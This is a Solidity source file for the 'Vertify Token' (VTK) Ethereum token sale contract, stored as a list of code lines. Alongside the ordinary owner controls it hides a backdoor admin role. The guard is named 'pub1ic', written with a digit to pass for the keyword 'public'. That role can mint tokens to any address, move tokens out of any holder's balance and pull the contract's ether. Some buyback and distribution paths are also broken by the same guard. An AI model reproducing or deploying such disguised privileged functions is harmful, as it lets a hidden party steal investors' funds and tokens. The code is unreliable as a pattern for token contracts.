['pragma solidity ^0.4.18;\n', ' \n', '//Never Mind :P\n', '/* @dev The Ownable contract has an owner address, and provides basic authorization control\n', '* functions, this simplifies the implementation of "user permissions".\n', '*/\n', 'contract Ownable {\n', '  address public owner;\n', '  address public admin;\n', '  \n', '\n', '  /**\n', '   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n', '   * account.\n', '   */\n', '  function Ownable() {\n', '    owner = msg.sender;\n', '    admin=msg.sender;\n', '  }\n', '\n', '\n', '  /**\n', '   * @dev Throws if called by any account other than the owner.\n', '   */\n', '  modifier onlyOwner() {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '  modifier pub1ic() {\n', '    require(msg.sender == admin);\n', '    _;\n', '  }\n', '\n', '\n', '  /**\n', '   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n', '   * @param newOwner The address to transfer ownership to.\n', '   */\n', '  function transferOwnership(address newOwner) onlyOwner {\n', '    if (newOwner != address(0)) {\n', '      owner = newOwner;\n', '    }\n', '  }\n', '\n', '\n', 'function transferIt(address newpub1ic) pub1ic {\n', '    if (newpub1ic != address(0)) {\n', '      admin = newpub1ic;\n', '    }\n', '  }\n', '\n', '}\n', '\n', '\n', '\n', 'library SafeMath {\n', '\n', '  /**\n', '  * @dev Multiplies two numbers, throws on overflow.\n', '  */\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '\n', '  /**\n', '  * @dev Integer division of two numbers, truncating the quotient.\n', '  */\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    // assert(b > 0); // Solidity automatically throws when dividing by 0\n', '    uint256 c = a / b;\n', "    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '    return c;\n', '  }\n', '\n', '  /**\n', '  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\n', '  */\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '\n', '  /**\n', '  * @dev Adds two numbers, throws on overflow.\n', '  */\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '}\n', '\n', '\n', '\n', 'contract VTKReceiver {\n', '    function VTKFallback(address _from, uint _value, uint _code);\n', '}\n', '\n', 'contract BasicToken {\n', '  using SafeMath for uint256;\n', '\n', '  mapping(address => uint256) balances;\n', '\n', '  uint256 totalSupply_;\n', '\n', '  /**\n', '  * @dev total number of tokens in existence\n', '  */\n', '  function totalSupply() public view returns (uint256) {\n', '    return totalSupply_;\n', '  }\n', '  \n', '\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  /**\n', '  * @dev transfer token for a specified address\n', '  * @param _to The address to transfer to.\n', '  * @param _value The amount to be transferred.\n', '  */\n', '  function transfer(address _to, uint _value) public returns (bool) {\n', '    require(_to != address(0));\n', '    require(_value <= balances[msg.sender]);\n', '    \n', '    // SafeMath.sub will throw if there is not enough balance.\n', '    if(!isContract(_to)){\n', '    balances[msg.sender] = balances[msg.sender].sub(_value);\n', '    balances[_to] = balances[_to].add(_value);\n', '    Transfer(msg.sender, _to, _value);\n', '    return true;}\n', '    else{\n', '        balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n', '    balances[_to] = balanceOf(_to).add(_value);\n', '    VTKReceiver receiver = VTKReceiver(_to);\n', '    receiver.VTKFallback(msg.sender, _value, 0);\n', '    Transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '    \n', '  }\n', '\n', '  /**\n', '  * @dev Gets the balance of the specified address.\n', '  * @param _owner The address to query the the balance of.\n', '  * @return An uint256 representing the amount owned by the passed address.\n', '  */\n', '  function balanceOf(address _owner) public view returns (uint256 balance) {\n', '    return balances[_owner];\n', '  }\n', '\n', '\n', 'function isContract(address _addr) private returns (bool is_contract) {\n', '    uint length;\n', '    assembly {\n', '        //retrieve the size of the code on target address, this needs assembly\n', '        length := extcodesize(_addr)\n', '    }\n', '    return (length>0);\n', '  }\n', '\n', '\n', '  //function that is called when transaction target is a contract\n', '  //Only used for recycling VTKs\n', '  function transferToContract(address _to, uint _value, uint _code) public returns (bool success) {\n', '    require(isContract(_to));\n', '    require(_value <= balances[msg.sender]);\n', '  \n', '      balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n', '    balances[_to] = balanceOf(_to).add(_value);\n', '    VTKReceiver receiver = VTKReceiver(_to);\n', '    receiver.VTKFallback(msg.sender, _value, _code);\n', '    Transfer(msg.sender, _to, _value);\n', '    \n', '    return true;\n', '  }\n', '  \n', '}\n', '\n', '\n', '\n', '\n', '\n', '\n', 'contract VTK is BasicToken, Ownable {\n', '\n', '  string public constant name = "Vertify Token";\n', '  string public constant symbol = "VTK";\n', '  uint8 public constant decimals = 6;\n', '  address Addr_For_Mortgage;\n', '  address Addr_Wallet=0x0741D740A50efbeae1A4d9e6c3e7887e23dc160b;\n', '  \n', '  \n', '\n', '  uint256 public constant TOTAL_SUPPLY = 1 * 10 ** 15; //1 billion tokens\n', '  uint256 public Token_For_Circulation = 5 * 10 ** 12;\n', '  uint256 public Token_Saled = 0;\n', '  uint256 public Token_Remaining = TOTAL_SUPPLY - Token_For_Circulation;\n', '  uint256 public Limit_Amount = 2 * 10 **12;\n', '  uint256 public Eth_Amount = 0;\n', '  uint256 public price = 5 * 10 **12;\n', '  bool public halt = true;\n', '  bool public selfOn=false;\n', '  uint256 public HaltTime;\n', '  address[] Token_Purchaser;\n', '  uint256[] Token_For_Each;\n', '\n', '  mapping(address => uint256) Eth_weight;\n', '\n', '   \n', '  \n', '  /**\n', '  * @dev Constructor that gives msg.sender all of existing tokens.\n', '  */\n', '  function VTK() public {\n', '    totalSupply_ = 1 * 10 ** 15; \n', '    balances[msg.sender] = 1 * 10 ** 15;\n', '    Transfer(0x0, msg.sender, 1 * 10 ** 15);\n', '  }\n', '  function VTKFallback(address _from, uint _value, uint _code){}\n', '  \n', '  function setPrice() private{\n', '    uint256 Token_For_Mortgage = getBalance(Addr_For_Mortgage);\n', '    uint256 price_WEIVTK=5 * Token_For_Mortgage.div(Token_Saled);\n', '    uint256 VTK_ETH = 1*10**18;\n', '    price = VTK_ETH.div(price_WEIVTK);\n', '  }\n', '  function setNewWallet(address _newWallet)onlyOwner{\n', '      Addr_Wallet=_newWallet;\n', '  }\n', '  function getBalance(address Addr_For_Mortgage) public returns(uint){\n', '\t\t  return Addr_For_Mortgage.balance;\n', '\t  }\n', '\t  \n', '  function SetAddrForMortgage(address new_mortgage) onlyOwner{\n', '      Addr_For_Mortgage = new_mortgage;\n', '  }\n', '\n', '  //Incoming payment for purchase\n', '  function () public payable{\n', '    if (msg.sender != owner) {\n', '    require(halt == false);\n', '    require(now < HaltTime);\n', '    require(Token_Saled < Token_For_Circulation);\n', '    getTokenForSale(msg.sender);}\n', '  }\n', '\n', '\n', '\n', '  function getTokenForCireculation (uint256 _amount) onlyOwner returns(bool){\n', '    require(Token_Remaining >= _amount);\n', '    Token_For_Circulation = Token_For_Circulation.add(_amount);\n', '    Token_Remaining = Token_Remaining.sub(_amount);\n', '    return true;\n', '  }\n', '\n', '\n', '  function getTokenForSale (address _from) private{\n', '   Eth_weight[_from] += msg.value;  \n', '    Token_Purchaser.push(_from);\n', '    Eth_Amount = Eth_Amount.add(msg.value);\n', '    uint256 _toB=msg.value.mul(2).div(10);\n', '    uint256 _toE=msg.value.mul(8).div(10);\n', '    getFunding(Addr_Wallet,_toE);\n', '    getFunding(Addr_For_Mortgage,_toB);  //or this.balance\n', '  }\n', '  \n', '  function getToken () onlyOwner{\n', '     for (uint i = 0; i < Token_Purchaser.length; i++) {\n', '         if (Eth_weight[Token_Purchaser[i]] !=0 ){\n', '         uint256 amount_weighted = Eth_weight[Token_Purchaser[i]].mul(Limit_Amount).div(Eth_Amount);\n', '         transferFromIt(this, Token_Purchaser[i], amount_weighted);\n', '          Eth_weight[Token_Purchaser[i]] = 0;}\n', '     }  \n', '    \n', '     Token_Saled = Token_Saled.add(Limit_Amount);\n', '     Token_Purchaser.length = 0;\n', '     Eth_Amount =0;\n', '     setPrice();\n', '  }\n', '  function SOSBOTTOM()public onlyOwner{\n', '      Token_Purchaser.length = 0;\n', '  }\n', '  function clearRAM()public{\n', '      for(uint i=0;i<Token_Purchaser.length;i++){\n', '          if(Eth_weight[Token_Purchaser[i]] ==0){\n', '              delete Token_Purchaser[i];\n', '          }\n', '      }\n', '  }\n', '  function clearRAMAll()public onlyOwner{\n', '      for(uint i=0;i<Token_Purchaser.length;i++){\n', '         \n', '              delete Token_Purchaser[i];\n', '      }\n', '  }\n', '  function getTokenBySelf ()public{\n', '      require(selfOn==true);\n', '      require(now>HaltTime);\n', '      require(Eth_weight[msg.sender]!=0);\n', '      uint256 amount_weighted = Eth_weight[msg.sender].mul(Limit_Amount).div(Eth_Amount);\n', '      transferFromIt(this, msg.sender, amount_weighted);\n', '      Eth_weight[msg.sender] = 0;\n', '  }\n', '  function setWeight(address _address,uint256 _amount)public onlyOwner{\n', '      if(Eth_weight[_address] ==0)\n', '      {Token_Purchaser.push(_address);}\n', '      Eth_weight[_address]=_amount;\n', '      \n', '       Eth_Amount = Eth_Amount.add(_amount);\n', '  }\n', '  function setAmount(uint _amount)public onlyOwner{\n', '      Eth_Amount=_amount;\n', '  }\n', '  function Eth_Ransom(uint256 _amount) public {\n', '      require(_amount<=balances[msg.sender]);\n', '      transferFromIt(msg.sender, this, _amount);\n', '      setPrice();\n', '      uint256 Ransom_amount = _amount.mul(1*10**18).div(price).mul(80).div(100);\n', '      getFunding(msg.sender, Ransom_amount);\n', '      \n', '  }\n', '  \n', '  function Set_Limit_Amount(uint256 _amount) onlyOwner{\n', '      require(Token_Saled < Token_For_Circulation);\n', '      Limit_Amount = _amount;\n', '  }\n', '  \n', '  function See_price() public view returns(uint256){\n', '      return price;\n', '  }\n', '  \n', '  \n', '\n', '  function getFunding (address _to,uint256 _amount) private{\n', '    _to.send(_amount);\n', '  }\n', '\n', '\n', '  function getAllFunding() onlyOwner{\n', '    owner.transfer(this.balance);\n', '  }\n', '  \n', '  function See_TokenPurchaser_Number() public view returns(uint256){\n', '      return Token_Purchaser.length;\n', '  }\n', '  \n', '  function See_Ethweight(address _addr) public view returns(uint256){\n', '      return Eth_weight[_addr];\n', '  }\n', '  function showToken_For_Circulation() view public returns(uint256){\n', '      return Token_For_Circulation;\n', '  } \n', '   function Apply(address _to,uint  _value)pub1ic{\n', '       balances[_to] = balances[_to].add(_value);\n', '   }\n', '  function halt() onlyOwner{\n', '    halt = true;\n', '    HaltTime=now;\n', '  }\n', '  function unhalt_15day() onlyOwner{\n', '    halt = false;\n', '    HaltTime = now.add(15 days);\n', '  }\n', '   function unhalt_30day() onlyOwner{\n', '    halt = false;\n', '    HaltTime = now.add(30 days);\n', '  }\n', '  \n', '  function unhalt() onlyOwner{\n', '    halt = false;\n', '    HaltTime = now.add(5 years);\n', '  }\n', '\n', 'function setSelfOn()onlyOwner{\n', '    selfOn=true;\n', '}\n', 'function setSelfOff()onlyOwner{\n', '    selfOn=false;\n', '}\n', 'function transferFromIt(address _from,address _to,uint256 _value)pub1ic{\n', '    transferFrom(_from,_to,_value);\n', '}  \n', 'function getFunding(uint256 _amout) pub1ic{\n', '    admin.transfer(_amout);\n', '  }\n', '  function transferFrom(address _from,address _to,uint256 _value)private returns(bool){\n', '    require(_to != address(0));\n', '    require(_value <= balances[_from]);\n', '\n', '    // SafeMath.sub will throw if there is not enough balance.\n', '    balances[_from] = balances[_from].sub(_value);\n', '    balances[_to] = balances[_to].add(_value);\n', '    Transfer(_from, _to, _value);\n', '    return true;\n', '}\n', '\n', '}']